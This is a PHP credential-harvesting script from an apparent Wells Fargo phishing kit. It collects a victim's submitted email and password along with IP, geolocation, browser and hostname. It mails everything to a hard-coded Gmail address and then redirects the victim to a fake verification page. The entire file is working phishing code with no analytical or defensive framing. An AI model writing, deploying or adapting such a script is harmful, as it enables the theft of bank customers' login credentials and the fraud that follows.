<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "---------------+ Wells Fargo +--------------\n";
$message .= "Email address: ".$_POST['em']."\n";
$message .= "Password: ".$_POST['epass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser:".$browserAgent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "country: ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created By WeStGiRl-----------------\n";
$send = "gentlesouldelivers@gmail.com";
$subject = "Wells Fargo 2 $ip | ".$_POST['em']." ".$_POST['epass']."\n";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);
$praga=rand();
$praga=md5($praga); 
header("Location: verify.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
	  